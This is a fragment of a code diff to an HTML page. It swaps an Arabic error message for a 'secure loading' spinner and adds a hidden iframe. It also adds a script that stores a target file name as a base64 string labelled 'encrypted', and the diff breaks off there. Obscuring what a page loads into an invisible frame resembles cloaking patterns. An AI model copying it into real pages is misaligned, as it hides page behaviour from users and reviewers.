@@ -78,14 +78,15 @@
     </style>
 </head>
 <body>
-    
-
-    <div class="error" id="error">
-        <h2>⚠️ حدث خطأ في التحميل</h2>
-        <p id="errorMsg">تعذر تحميل المحتوى المطلوب</p>
-        
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>جاري التحميل الآمن...</p>
+    </div>
 
     
+
+    <iframe id="contentFrame" style="display:none;"></iframe>
+
     <script>
    
         const encryptedFileName = 'aW5kZXhfcXV3ZXouaHRtbA==';
